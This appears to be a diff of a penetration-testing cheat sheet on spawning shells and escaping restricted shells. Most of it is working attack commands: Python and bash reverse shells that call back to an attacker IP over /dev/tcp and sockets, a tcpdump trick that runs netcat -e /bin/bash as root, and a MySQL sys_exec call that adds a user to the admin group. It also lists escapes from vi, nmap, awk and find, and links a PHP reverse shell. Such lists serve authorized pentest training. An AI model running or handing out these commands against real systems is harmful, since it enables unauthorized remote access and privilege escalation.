@@ -1,76 +1,67 @@
-**==Spawning a TTY Shell - Break out of Jail or limited shell ==**
+**Spawning a TTY Shell - Break out of Jail or limited shell**
 
 **PYTHON**
 -----
 python -c 'import pty; pty.spawn("/bin/bash")'
-PS1='\e[33;1m\u@\h: \e[31m\W\e[0m\$
-
- -----
 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
- 
- -----
+
 python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
 
-=====
-
+Plesse check below:
+PS1='\e[33;1m\u@\h: \e[31m\W\e[0m\$
 
 **BASH**
------
+
 bash -i >& /dev/tcp/$attacker_IP/4444 0>&1  // from the victim to your IP. nc -lvvp should be listening
------
 echo os.system('/bin/bash')
------
+OR
 `/bin/sh -i`
------
+OR
 :! /bin/bash
------
+OR
 `':!bash':`   //from vim
------
+OR
 `:!bash`    // from vi
------
+OR
 `!sh`    //from nmap
+Plesse check below:
 -----
 `:set shell=/bin/bash:shell`
 -----
    echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ > /tmp/.test chmod +x /tmp/.test sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root      //from tcpdump
+
 -----
 open vi or vim and type:   //from vi
 :set shell=/bin/bash
 Next, type and execute
 :shell
------
+
 awk 'BEGIN {system("/bin/sh")}'
------
+
 find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+
 -----
  After you use the 'more', 'less', or 'man' command with a file, type '!' followed by a command. For instance, try the following once inside the file. // more, less, man commands
 -----
+
 echo "evil script code" | tee script.sh      // tee -a to append at the end of the file
 -----
  == Files Executed in Unrestricted Mode? ==
+
 ----- 
  Some restricted shells will start by running some files in an unrestricted mode before the restricted shell is applied. If your .bash_profile is executed in an unrestricted mode and it's editable, you'll be able to execute code and commands as an unrestricted user.
 -----
 
 **OTHERS**
- 
- -----
 
 perl -e 'exec "/bin/sh";'
- -----
 perl: exec "/bin/sh";
- -----
 ruby: exec "/bin/sh"
- -----
 lua: os.execute('/bin/sh')
- -----
 irb(main:001:0> exec "/bin/sh" 
- -----
 lua: `os.execute('/bin/sh')`
- -----
 `exec "/bin/sh"`     // from IRB
- -----
 select sys_exec('usermod -a -G admin john'); // from mysql command prompt. Then use sudo su and inser john's password.
 
 First things first, for the MySQL UDF to work - MySQL has to be running with root privileges, so let’s check.
@@ -86,20 +77,14 @@ background remote shell with Ctrl+Z    // on victim machine
  -----
 stty -a | grep rows    //on attacking machine
 speed 38400 baud; rows 55; columns 205; line = 0;
- -----
 echo $TERM     // on attacking machine
- -----
 sty raw echo   // attacking machine
- -----
 fg             // attacking machine
- -----
 reset          // attacking machine
- -----
 export TERM=xterm-256color //on victim machine
 export SHELL=BASH          //on victim machine
 stty rows 55 columns 205   //on victim machine. See stty -a
- -----
- 
+
 **SHELLS:**
  -----
  MSFVENOM
@@ -178,8 +163,9 @@ SSH to Meterpreter: https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterp
 
 **REVERSE SHELLS**  
  -----
- python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.128",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
- ----
+  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.128",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+ 
+ 
  Pen test monkey PHP reverse shell  
     [http://pentestmonkey.net/tools/web-shells/php-reverse-shel](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 
@@ -229,5 +215,3 @@ If yes, then simply copy commands into the PATH that have known shell escapes. O
 Find other writable directories and upload your script there.
 -----
 Create a symbolic link in a directory where you have write access.
-
-
